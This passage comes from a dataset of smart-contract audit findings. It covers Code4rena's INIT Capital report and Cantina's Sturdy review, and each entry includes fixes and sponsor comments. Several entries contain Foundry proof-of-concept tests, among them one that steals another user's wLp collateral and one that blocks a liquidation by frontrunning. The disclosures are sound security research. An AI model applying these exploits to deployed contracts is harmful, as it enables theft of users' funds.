it can be observed, `_handleWithdraw` doesn't check `param.returnNative` and not adjust the `uTokenReceiver` token receiver to `address(this)` when `param.returnNative` is set to true.\n\nNow, when `execute` finish perform the multicall and check that `_params.returnNative` is set to true, it will not work properly as the token is not send to the Hook.\n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L76-L80>\n\n```solidity\n    function execute(OperationParams calldata _params)\n        external\n        payable\n        returns (uint posId, uint initPosId, bytes[] memory results)\n    {\n        // create position if not exist\n        if (_params.posId == 0) {\n            (posId, initPosId) = createPos(_params.mode, _params.viewer);\n        } else {\n            // for existing position, only owner can execute\n            posId = _params.posId;\n            initPosId = initPosIds[msg.sender][posId];\n            _require(IERC721(POS_MANAGER).ownerOf(initPosId) == address(this), Errors.NOT_OWNER);\n        }\n        results = _handleMulticall(initPosId, _params);\n        // check slippage\n        _require(_params.minHealth_e18 <= IInitCore(CORE).getPosHealthCurrent_e18(initPosId), Errors.SLIPPAGE_CONTROL);\n        // unwrap token if needed\n        for (uint i; i < _params.withdrawParams.length; i = i.uinc()) {\n            address helper = _params.withdrawParams[i].rebaseHelperParams.helper;\n            if (helper != address(0)) IRebaseHelper(helper).unwrap(_params.withdrawParams[i].to);\n        }\n        // return native token\n        if (_params.returnNative) {\n>>>         IWNative(WNATIVE).withdraw(IERC20(WNATIVE).balanceOf(address(this)));\n>>>         (bool success,) = payable(msg.sender).call{value: address(this).balance}('');\n            _require(success, Errors.CALL_FAILED);\n        }\n    }\n```\n\nThis could disrupt user expectations. Consider a third-party contract integrated with this hook that can only operate using native balance, doesn't expect, and cannot handle tokens/ERC20. This can cause issues for the integrator.\n\n### Recommended Mitigation Steps\n\nWhen constructing withdraw operation, check if `_params.returnNative` is set to true, and change `uTokenReceiver` to `address(this`.\n\n<details>\n\n```diff\n-    function _handleWithdraw(uint _offset, bytes[] memory _data, uint _initPosId, WithdrawParams[] calldata _params)\n+    function _handleWithdraw(uint _offset, bytes[] memory _data, uint _initPosId, WithdrawParams[] calldata _params, bool _returnNative)\n        internal\n        view\n        returns (uint, bytes[] memory)\n    {\n        for (uint i; i < _params.length; i = i.uinc()) {\n            // decollateralize to pool\n            _data[_offset] = abi.encodeWithSelector(\n                IInitCore.decollateralize.selector, _initPosId, _params[i].pool, _params[i].shares, _params[i].pool\n            );\n            _offset = _offset.uinc();\n            // burn collateral to underlying token\n            address helper = _params[i].rebaseHelperParams.helper;\n            address uTokenReceiver = _params[i].to;\n            // if need to unwrap to rebase token\n            if (helper != address(0)) {\n                address uToken = ILendingPool(_params[i].pool).underlyingToken();\n                _require(\n                    _params[i].rebaseHelperParams.tokenIn == uToken\n                        && IRebaseHelper(_params[i].rebaseHelperParams.helper).YIELD_BEARING_TOKEN() == uToken,\n                    Errors.INVALID_TOKEN_IN\n                );\n                uTokenReceiver = helper;\n            }\n+            if (_returnNative && uToken == WNATIVE) {\n+                uTokenReceiver = address(this);\n+            }\n            _data[_offset] = abi.encodeWithSelector(IInitCore.burnTo.selector, _params[i].pool, uTokenReceiver);\n            _offset = _offset.uinc();\n        }\n        return (_offset, _data);\n    }\n```\n\n```diff\n    function _handleMulticall(uint _initPosId, OperationParams calldata _params)\n        internal\n        returns (bytes[] memory results)\n    {\n        // prepare data for multicall\n        // 1. repay (if needed)\n        // 2. withdraw (if needed)\n        // 3. change position mode (if needed)\n        // 4. borrow (if needed)\n        // 5. deposit (if needed)\n        bool changeMode = _params.mode != 0 && _params.mode != IPosManager(POS_MANAGER).getPosMode(_initPosId);\n        bytes[] memory data;\n        {\n            uint dataLength = _params.repayParams.length + (2 * _params.withdrawParams.length) + (changeMode ? 1 : 0)\n                + _params.borrowParams.length + (2 * _params.depositParams.length);\n            data = new bytes[](dataLength);\n        }\n        uint offset;\n        // 1. repay\n        (offset, data) = _handleRepay(offset, data, _initPosId, _params.repayParams);\n        // 2. withdraw\n-        (offset, data) = _handleWithdraw(offset, data, _initPosId, _params.withdrawParams);\n+        (offset, data) = _handleWithdraw(offset, data, _initPosId, _params.withdrawParams, _params.returnNative);\n        // 3. change position mode\n        if (changeMode) {\n            data[offset] = abi.encodeWithSelector(IInitCore.setPosMode.selector, _initPosId, _params.mode);\n            offset = offset.uinc();\n        }\n        // 4. borrow\n        (offset, data) = _handleBorrow(offset, data, _initPosId, _params.borrowParams);\n        // 5. deposit\n        (offset, data) = _handleDeposit(offset, data, _initPosId, _params.depositParams);\n        // execute multicall\n        results = IMulticall(CORE).multicall(data);\n    }\n```\n</details>\n\n\n**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/29#issuecomment-1870324594)**\n\n\n***\n\n",
      "summary": "\nThe bug report is about a problem with the `MoneyMarketHook` contract's `execute` function. When the `param.returnNative` is set to true, users expect the returned token from a withdraw operation to be in its native form and sent to the caller. However, the current implementation does not consider this and can disrupt user expectations. This could cause issues for third-party contracts that can only operate using native balance. The recommended mitigation steps involve checking for the `param.returnNative` and changing the token receiver to `address(this)` in the `handleWithdraw` function. The bug has been confirmed and will be fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/29",
      "tags": [],
      "finders": [
        "said"
      ]
    },
    {
      "id": "29593",
      "title": "[M-02] Decimals of LendingPool don't take into account the offset introduced by VIRTUAL\\_SHARES",
      "impact": "MEDIUM",
      "content": "\nThe impact of this finding is more on the marketing/data fetching side, on exchanges it would appear that the shares are worth less `VIRTUAL_SHARES` than the underlying token. Given that it would influence the perception of the value of the shares token, medium severity seems appropriate.\n\n### Proof of Concept\n\nThe Openzeppelin [implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol#L106-L108) includes the decimals offset (log10(`VIRTUAL_SHARES`) in LendingPool) in the `decimals()` function. However, INIT only places the decimals of the [underlying](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/lending_pool/LendingPool.sol#L95-L97).\n\nA POC was built, add it to `TestLendingPool.sol`:\n\n```solidity\nfunction test_POC_WrongDecimals() public {\n    uint256 _wbtcAmount = 3e8; // 3 BTC\n    address _user = makeAddr(\"user\");\n    _mintPool(_user, WBTC, _wbtcAmount);\n    uint256 _wbtcDecimals = 1e8;\n    uint256 VIRTUAL_SHARES = 1e8;\n    uint256 _poolDecimals = 10**lendingPools[WBTC].decimals();\n    uint256 _userBalance = lendingPools[WBTC].balanceOf(_user);\n    assertEq(_userBalance/_poolDecimals, _wbtcAmount/_wbtcDecimals*VIRTUAL_SHARES);\n    assertEq(_userBalance/_poolDecimals, 3e8);\n    assertEq(_userBalance, _wbtcAmount*VIRTUAL_SHARES);\n}\n```\n\n### Tools Used\n\nVscode, Foundry\n\n### Recommended Mitigation Steps\n\nInclude the virtual shares decimals in the `decimals()` function:\n\n```solidity\nuint private constant VIRTUAL_SHARES = 8;\n...\nfunction decimals() public view override returns (uint8) {\n    return IERC20Metadata(underlyingToken).decimals() + VIRTUAL_SHARES;\n}\n...\nfunction _toShares(uint _amt, uint _totalAssets, uint _totalShares) internal pure returns (uint shares) {\n    return _amt.mulDiv(_totalShares + 10**VIRTUAL_SHARES, _totalAssets + VIRTUAL_ASSETS);\n}\n...\nfunction _toAmt(uint _shares, uint _totalAssets, uint _totalShares) internal pure returns (uint amt) {\n    return _shares.mulDiv(_totalAssets + VIRTUAL_ASSETS, _totalShares + 10**VIRTUAL_SHARES);\n}\n```\n\n**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/36#issuecomment-1870338593)**\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a finding that could potentially affect the marketing and data fetching aspect of a token exchange. It involves an incorrect calculation of the value of shares compared to the underlying token, which could impact the perceived value of the shares. The report includes a proof of concept and recommends a mitigation step to include the virtual shares decimals in the `decimals()` function. The tools used for this report were Vscode and Foundry. The bug has been confirmed by the team responsible for the token (INIT).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/36",
      "tags": [],
      "finders": [
        "0x73696d616f"
      ]
    },
    {
      "id": "29592",
      "title": "[M-01] repay(), liquidate() and liquidateWLp() receive shares as argument, which may revert if from approval to tx settled blocks have passed",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L151> \n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L282> \n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L317>\n\n`repay()`, `liquidate()` and `liquidateWLp()` transactions revert if users approve the exact repay amount they need in the frontend and only after some blocks have passed is the transaction settled. This happens because the interest accrual is by timestamp, so the debt would have increased since the approval, when the transaction settles.\n\n### Proof of Concept\n\nA test when repaying debt was carried out in `TestInitCore.sol`. The timestamp increased just 1 second, but it was enough to make the transaction revert. It may be possible to request a bigger alowance than expected, but this has other implications.\n\n```solidity\nfunction test_POC_TransferFromFails_DueToDebtAccrual() public {\n    uint256 _wbtcAmount = 3e8;\n    uint256 _borrowAmount = 1e8;\n    address _user = makeAddr(\"user\");\n    deal(WBTC, _user, _wbtcAmount);\n    \n    uint256 _posId = _createPos(_user, _user, 2);\n    uint256 shares_ = _mintPool(_user, address(lendingPools[WBTC]), _wbtcAmount, \"\");\n    vm.startPrank(_user);\n    lendingPools[WBTC].transfer(address(positionManager), shares_);\n    initCore.collateralize(_posId, address(lendingPools[WBTC]));\n    vm.stopPrank();\n\n    uint256 _debtShares = _borrow(_user, _posId, address(lendingPools[WBTC]), _borrowAmount, \"\");\n\n    uint256 _userDebtBalance = lendingPools[WBTC].debtShareToAmtCurrent(_debtShares);\n\n    vm.prank(_user);\n    IERC20(WBTC).approve(address(initCore), _userDebtBalance);\n\n    skip(1); \n\n    vm.prank(_user);\n    vm.expectRevert(\"ERC20: transfer amount exceeds balance\");\n    initCore.repay(address(lendingPools[WBTC]), _debtShares, _posId);\n}\n```\n\n### Tools Used\n\nVscode, Foundry\n\n### Recommended Mitigation Steps\n\nReceive the amount in InitCore as argument instead of the shares on the `repay()`, `liquidate()` and `liquidateWLp()` functions.\n\n**[fez-init (INIT) acknowledged and commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/38#issuecomment-1871620933):**\n > The issue should be mitigated with the introduction of hooks, where such additional logic of amount to share conversion can be implemented. \n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `repay()`, `liquidate()`, and `liquidateWLp()` functions in the `InitCore.sol` contract. These transactions can fail if the user approves the exact amount they need to repay in the frontend and the transaction is settled after some blocks have passed. This is because the interest accrual is based on timestamp, so the debt may have increased since the approval. A test was carried out to demonstrate this issue in the `TestInitCore.sol` contract. The recommended mitigation step is to receive the amount as an argument instead of the shares in these functions. The tools used for this report were VSCode and Foundry. The fez-init team has acknowledged and commented on this issue and suggested implementing additional logic in the form of hooks to mitigate it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/38",
      "tags": [],
      "finders": [
        "0x73696d616f"
      ]
    },
    {
      "id": "29591",
      "title": "[H-03] `_handleRepay` of `MoneyMarketHook` does not consider the actual debt shares of the `posId` inside the position manager and could lead to a user's tokens getting stuck inside the hook",
      "impact": "HIGH",
      "content": "\nWhen users construct repay operations via `MoneyMarketHook`, it doesn't consider the actual debt shares of the position inside the `InitCore` and `PosManager`. This could lead to users' tokens getting stuck inside the `MoneyMarketHook` contract.\n\n### Proof of Concept\n\nWhen users want to repay his positions in `MoneyMarketHook`, they can provide the parameters inside `repayParams`, and `MoneyMarketHook` will construct the operation via `_handleRepay` function.\n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/hook/MoneyMarketHook.sol#L145-L159>\n\n```solidity\n    function _handleRepay(uint _offset, bytes[] memory _data, uint _initPosId, RepayParams[] memory _params)\n        internal\n        returns (uint, bytes[] memory)\n    {\n        for (uint i; i < _params.length; i = i.uinc()) {\n            address uToken = ILendingPool(_params[i].pool).underlyingToken();\n>>>         uint repayAmt = ILendingPool(_params[i].pool).debtShareToAmtCurrent(_params[i].shares);\n            _ensureApprove(uToken, repayAmt);\n>>>         IERC20(uToken).safeTransferFrom(msg.sender, address(this), repayAmt);\n            _data[_offset] =\n                abi.encodeWithSelector(IInitCore.repay.selector, _params[i].pool, _params[i].shares, _initPosId);\n            _offset = _offset.uinc();\n        }\n        return (_offset, _data);\n    }\n```\n\nIt can be observed that it calculates the `repayAmt` based on the shares provided by the users and transfers the corresponding amount of tokens from the sender to the hook. However, the actual debt shares of the position can be less than the `_params[i].shares` provided by users. This means that the actual repay amount of tokens needed could be less than the calculated `repayAmt`.\n\n<https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/InitCore.sol#L530-L551>\n\n```solidity\n    function _repay(IConfig _config, uint16 _mode, uint _posId, address _pool, uint _shares)\n        internal\n        returns (address tokenToRepay, uint amt)\n    {\n        // check status\n        _require(_config.getPoolConfig(_pool).canRepay && _config.getModeStatus(_mode).canRepay, Errors.REPAY_PAUSED);\n        // get position debt share\n>>>     uint positionDebtShares = IPosManager(POS_MANAGER).getPosDebtShares(_posId, _pool);\n>>>     uint sharesToRepay = _shares < positionDebtShares ? _shares : positionDebtShares;\n        // get amtToRepay (accrue interest)\n>>>     uint amtToRepay = ILendingPool(_pool).debtShareToAmtCurrent(sharesToRepay);\n        // take token from msg.sender to pool\n        tokenToRepay = ILendingPool(_pool).underlyingToken();\n>>>     IERC20(tokenToRepay).safeTransferFrom(msg.sender, _pool, amtToRepay);\n        // update debt on the position\n        IPosManager(POS_MANAGER).updatePosDebtShares(_posId, _pool, -sharesToRepay.toInt256());\n        // call repay on the pool\n        amt = ILendingPool(_pool).repay(sharesToRepay);\n        // update debt on mode\n        IRiskManager(riskManager).updateModeDebtShares(_mode, _pool, -sharesToRepay.toInt256());\n        emit Repay(_pool, _posId, msg.sender, _shares, amt);\n    }\n```\n\nConsider a scenario where the user's positions are currently liquidatable, and the user wishes to repay all of the position's debt inside the `MoneyMarketHook`. However, a liquidator front-runs the operation by liquidating the user's position. Now, when the repayment operation executes from `MoneyMarketHook`, it transfers the `repayAmt` to the `MoneyMarketHook` but the amount is not used/fully utilized and becomes stuck inside the contract.\n\n### Recommended Mitigation Steps\n\nConsider to also check the provided shares against the actual debt shares inside the `InitCore`/`PosManager`.\n\n**[fez-init (INIT) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/28#issuecomment-1870322481):**\n > The issue should be medium, since the funds cannot be retrieved by someone else. The hook will be upgradeable, so if funds actually get stuck, it is still retrievable.\n\n**[hansfriese (Judge) commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/28#issuecomment-1871745239):**\n > I agree that this issue is in the middle of Medium and High.\n> Users might face a temporary lock on their funds, and the hook should be upgraded every time to unlock them.\n>\n> Given the high probability of this scenario occurring, I will keep this issue as a valid High.\n\n\n***\n \n",
      "summary": "\nThe bug report discusses an issue where users' tokens can get stuck inside the MoneyMarketHook contract when they try to repay their positions. This happens because the contract does not consider the actual debt shares of the position, leading to an incorrect calculation of the amount of tokens needed for repayment. This can happen when a liquidator front-runs the operation, leaving the tokens stuck in the contract. To mitigate this issue, it is recommended to check the provided shares against the actual debt shares in the InitCore and PosManager contracts. The severity of this issue is debated, with some suggesting it is a medium issue and others considering it a high issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/28",
      "tags": [],
      "finders": [
        "said"
      ]
    },
    {
      "id": "29590",
      "title": "[H-02] wLp tokens could be stolen",
      "impact": "HIGH",
      "content": "\n`PosManager#removeCollateralWLpTo` function allows users to remove collateral wrapped in a wLp token that was previously supplied to the protocol:\n\n```solidity\nFile: PosManager.sol\n249:     function removeCollateralWLpTo(uint _posId, address _wLp, uint _tokenId, uint _amt, address _receiver)\n250:         external\n251:         onlyCore\n252:         returns (uint)\n253:     {\n254:         PosCollInfo storage posCollInfo = __posCollInfos[_posId];\n255:         // NOTE: balanceOfLp should be 1:1 with amt\n256:         uint newWLpAmt = IBaseWrapLp(_wLp).balanceOfLp(_tokenId) - _amt;\n257:         if (newWLpAmt == 0) { \n258:             _require(posCollInfo.ids[_wLp].remove(_tokenId), Errors.NOT_CONTAIN);\n259:             posCollInfo.collCount -= 1;\n260:             if (posCollInfo.ids[_wLp].length() == 0) {\n261:                 posCollInfo.wLps.remove(_wLp);\n262:             }\n263:             isCollateralized[_wLp][_tokenId] = false;\n264:         }\n265:         _harvest(_posId, _wLp, _tokenId);\n266:         IBaseWrapLp(_wLp).unwrap(_tokenId, _amt, _receiver);\n267:         return _amt;\n268:     }\n```\n\nThis function could be called only from the core contract using the `decollateralizeWLp` and `liquidateWLp` functions. However, it fails to check if the specified `tokenId` belongs to the current position, this check would take place only if removing is full - meaning no lp tokens remain wrapped in the wLp (line 257).\n\nThis would allow anyone to drain any other positions with supplied wLp tokens. The attacker only needs to create its own position, supply dust amount in wLp to it, and call `decollateralizeWLp` with the desired 'tokenId', also withdrawn amount should be less than the full wLp balance to prevent check on line 257. An attacker would receive almost all lp tokens and accrued rewards from the victim's wLp.\n\nA similar attack for harvesting the victim's rewards could be done through the `liquidateWLp` function.\n\n### Impact\n\nAttacker could drain any wLp token and harvest all accrued rewards for this token.\n\n### Proof of Concept\n\nThe next test added to the `tests/wrapper/TestWLp.sol` file could show an exploit scenario:\n\n```solidity\n    function testExploitStealWlp() public {\n        uint victimAmt = 100000000;\n        // Bob open position with 'tokenId' 1\n        uint bobPosId = _openPositionWithLp(BOB, victimAmt);\n        // Alice open position with 'tokenId' 2 and dust amount \n        uint alicePosId = _openPositionWithLp(ALICE, 1);\n        // Alice successfully de-collateralizes her own position using Bob's 'tokenId' and amounts less than Bob's position by 1 to prevent a revert\n        vm.startPrank(ALICE, ALICE);\n        initCore.decollateralizeWLp(alicePosId, address(mockWLpUniV2), 1, victimAmt - 1, ALICE);\n        vm.stopPrank();\n\n        emit log_uint(positionManager.getCollWLpAmt(bobPosId, address(mockWLpUniV2), 1));\n        emit log_uint(IERC20(lp).balanceOf(ALICE));\n    }\n\n```\n\n### Recommended Mitigation Steps\n\nConsider adding a check that position holds the specified token into the `removeCollateralWLpTo` function:\n\n```solidity\n_require(__posCollInfos[_posId].ids[_wlp].contains(_tokenId), Errors.NOT_CONTAIN);\n```\n\n**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/31#issuecomment-1870313456)**\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the `PosManager#removeCollateralWLpTo` function, which allows users to remove collateral wrapped in a wLp token that was previously supplied to the protocol. This function can only be called from the core contract using the `decollateralizeWLp` and `liquidateWLp` functions. However, it fails to check if the specified `tokenId` belongs to the current position, which means that anyone can drain any other positions with supplied wLp tokens. This could allow an attacker to steal all LP tokens and accrued rewards from the victim's wLp. The report also includes a proof of concept showing how this exploit could be carried out. To mitigate this issue, it is recommended to add a check that the position holds the specified token in the `removeCollateralWLpTo` function. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/31",
      "tags": [],
      "finders": [
        "sashik\\_eth",
        "said"
      ]
    },
    {
      "id": "29589",
      "title": "[H-01] Liquidations can be prevented by frontrunning and liquidating 1 debt (or more) due to wrong assumption in POS\\_MANAGER",
      "impact": "HIGH",
      "content": "\nUsers can avoid being liquidated if they frontrun liquidation calls with a liquidate call with 1 wei. Or, they may do a partial liquidation and avoid being liquidated before the interest reaches the value of the debt pre liquidation. The total interest stored in `__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest` would also be wrong.\n\n### Proof of Concept\n\nThe `POS_MANAGER` stores the total interest in `__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest`. Function `updatePosDebtShares()` [assumes](https://github.com/code-423n4/2023-12-initcapital/blob/main/contracts/core/PosManager.sol#L175) that `ILendingPool(_pool).debtShareToAmtCurrent(currDebtShares)` is always increasing, but this is not the case, as a liquidation may happen that reduces the current debt amount. This leads to calls to `updatePosDebtShares()` reverting.\n\nThe most relevant is when liquidating, such that users could liquidate themselves for small amounts (1) and prevent liqudiations in the same block. This is because the debt accrual happens over time, so if the block.timestamp is the same, no debt accrual will happen. Thus, if a liquidate call with 1 amount frontruns a liquidate call with any amount, the second call will revert.\n\nA user could still stop liquidations for as long as the accrued interest doesn't reach the last debt value before liquidation, if the user liquidated a bigger part of the debt.\n\nAdd the following test to `TestInitCore.sol`:\n\n```solidity\nfunction test_POC_Liquidate_reverts_frontrunning_PosManager_WrongAssumption() public {\n    address poolUSDT = address(lendingPools[USDT]);\n    address poolWBTC = address(lendingPools[WBTC]);\n    _setTargetHealthAfterLiquidation_e18(1, type(uint64).max); // by pass max health after liquidate capped\n    _setFixedRateIRM(poolWBTC, 0.1e18); // 10% per sec\n\n    uint collAmt;\n    uint borrAmt;\n\n    {\n        uint collUSD = 100_000;\n        uint borrUSDMax = 80_000;\n        collAmt = _priceToTokenAmt(USDT, collUSD);\n        borrAmt = _priceToTokenAmt(WBTC, borrUSDMax);\n    }\n\n    address liquidator = BOB;\n    deal(USDT, ALICE, collAmt);\n    deal(WBTC, liquidator, borrAmt * 2);\n\n    // provides liquidity for borrow\n    _fundPool(poolWBTC, borrAmt);\n\n    // create position and collateralize\n    uint posId = _createPos(ALICE, ALICE, 1);\n    _collateralizePosition(ALICE, posId, poolUSDT, collAmt, bytes(''));\n\n    // borrow\n    _borrow(ALICE, posId, poolWBTC, borrAmt, bytes(''));\n\n    // fast forward time and accrue interest\n    vm.warp(block.timestamp + 1 seconds);\n    ILendingPool(poolWBTC).accrueInterest();\n\n    uint debtShares = positionManager.getPosDebtShares(posId, poolWBTC);\n\n    _liquidate(liquidator, posId, 1, poolWBTC, poolUSDT, false, bytes(''));\n\n    // liquidate all debtShares\n    _liquidate(liquidator, posId, 1000, poolWBTC, poolUSDT, false, bytes('panic'));\n}\n```\n\n### Tools Used\n\nVscode, Foundry\n\n### Recommended Mitigation Steps\n\nUpdate the user's last debt position `__posBorrInfos[_posId].borrExtraInfos[_pool].totalInterest` on `_repay()`.\n\n**[fez-init (INIT) confirmed](https://github.com/code-423n4/2023-12-initcapital-findings/issues/42#issuecomment-1872425149)**\n\n\n**[hansfriese (Judge) commented](https://github.com/code-423n4/2023-12-initcapital-findings/issues/42#issuecomment-1872433152):**\n > After discussing internally with the sponsor/warden, we've confirmed the issue.\n> Here is a part of the discussion:\n> \n> > \"When it frontruns the liquidation with 1 share, it removes 1 share and 2 debt.<br>\n> > When it calculates the amount again in the following liquidation, the shares will be worth 1 less and it reverts.\"\n> \n> As a mitigation, we can update `extraInfo.totalInterest` only when [debtAmtCurrent > extraInfo.lastDebtAmt](https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/core/PosManager.sol#L176).\n>\n > ![image](https://github.com/code-423n4/2023-12-initcapital-findings/assets/45533148/c1bd109c-4c8e-4683-b559-055128efb64f)\n> \n > High is appropriate as the main invariant might be broken temporarily while repaying.\n\n***\n\n",
      "summary": "\nThis bug report discusses a potential issue in the `POS_MANAGER` contract where users may be able to avoid being liquidated by frontrunning liquidation calls or doing a partial liquidation. The report includes a proof of concept and recommended mitigation steps. The issue is caused by a wrong assumption in the `updatePosDebtShares()` function and can result in calls to this function reverting. The report recommends updating the user's last debt position on `_repay()` as a mitigation. The bug has been confirmed by the INIT team and the judge has suggested a possible solution. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "INIT Capital",
      "source_link": "https://code4rena.com/reports/2023-12-initcapital",
      "github_link": "https://github.com/code-423n4/2023-12-initcapital-findings/issues/42",
      "tags": [
        "Liquidation"
      ],
      "finders": [
        "0x73696d616f"
      ]
    },
    {
      "id": "54528",
      "title": "General lack of event emission in DebtManager and SiloGateway ",
      "impact": "LOW",
      "content": "## DebtManager and SiloGateway Audit\n\n## Context\n**File:** DebtManager.sol  \n**Line:** 107\n\n## Description\nThere is a general lack of event emission in DebtManager and SiloGateway.\n\n## Recommendation\nFor the sake of transparency and on-chain monitoring, consider using events for major operations such as:\n- `setAprOracle`\n- `setWhitelistedGateway`\n- `setZKVerifier`\n- etc.\n\n## Status\n- **Sturdy:** Addressed in commit `9424c323`.\n- **Cantina:** Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54527",
      "title": "position.lender isn't veriﬁed to be within _lenders array ",
      "impact": "LOW",
      "content": "## Analysis of _manualAllocation() Function in DebtManager.sol\n\n## Context\n- **File:** DebtManager.sol\n- **Line Range:** 300-332\n\n## Description\nThe `_manualAllocation()` function checks the validity of a lender (strategy) but does not verify if the lender already exists in the `_lenders` array. This may lead to scenarios where a lender has not been added or has been removed from the array, allowing other strategists to manage them while avoiding management through the `_zkVerifier`. \n\nFor example, if there are two lenders, A and B, with `_lenders = [lenderB]`, anyone could still modify lender A's allocation using `[lenderA]` as input, despite not being present in the `_lenders` array.\n\n## Recommendation\nConsider verifying that the lender has been included in the `_lenders` array.\n\n## Status\n- **Sturdy:** Addressed in commit `362bed73`.\n- **Cantina:** Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54526",
      "title": "Spelling Error ",
      "impact": "LOW",
      "content": "## Context\n**File:** DebtManager.sol  \n**Line:** 165  \n\n## Description\nA spelling mistake has been caught.\n\n## Recommendation\nInstall the Spell Code Checker VSCode extension.\n\n- **Incorrect:** verifer  \n- **Correct:** verifier  \n\n## Sturdy\nAddressed in commit `f2c952b7`.\n\n## Cantina\nFixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54525",
      "title": "Redundant asset variable in DebtManager ",
      "impact": "LOW",
      "content": "## Context\n**File:** DebtManager.sol  \n**Line:** 13\n\n## Description\nThe variable `asset` is set as immutable in the `DebtManager`, but it is neither part of an interface override nor used anywhere within the contract.\n\n## Recommendation\nConsider removing the variable, or shift asset validation in `SiloGateway` to this contract to utilize it.\n\n## Sturdy\nAddressed in commit `fbbe2ebf`.\n\n## Cantina\nFixed. The variable has been removed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54524",
      "title": "Rename _utilizationLimit to _utilizationTarget ",
      "impact": "LOW",
      "content": "## Code Review Summary\n\n## Context\n**File:** SiloGateway.sol  \n**Line:** 23\n\n## Description\nBased on its purpose and usage in `borrowAsset()`, a better variable name for `_utilizationLimit` would be `_utilizationTarget`: if the expected utilization rate exceeds the target, liquidity is pulled from other lenders to bring it down to that level.\n\n## Recommendation\nReplace `_utilizationLimit` with `_utilizationTarget`.\n\n## Status\n- **Sturdy:** Addressed in commit `f649a6df`.\n- **Cantina:** Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_sturdy_sep2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Manuel",
        "HickupHH3"
      ]
    },
    {
      "id": "54523",
      "title": "Increase granularity of utilization target ",
      "impact": "LOW",
      "content": "## SiloGateway Utilization Limits\n\n### Context\nSiloGateway.sol#L23\n\n### Description\nThe current implementation sets `_utilizationLimit` at a global SiloGateway level. However, markets with the same asset but different collaterals are likely to have different risk profiles and parameters, so it's a viable use-case to enable setting silo-specific utilization limits (targets).\n\n### Recommendation\nConsider adding silo-specific utilization targets that default to the global utilization target.\n\n### Status\n- **Sturdy:** Addressed in ChainSecurity commit `33a4136b`.\n- **Cantina:** Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Sturdy",
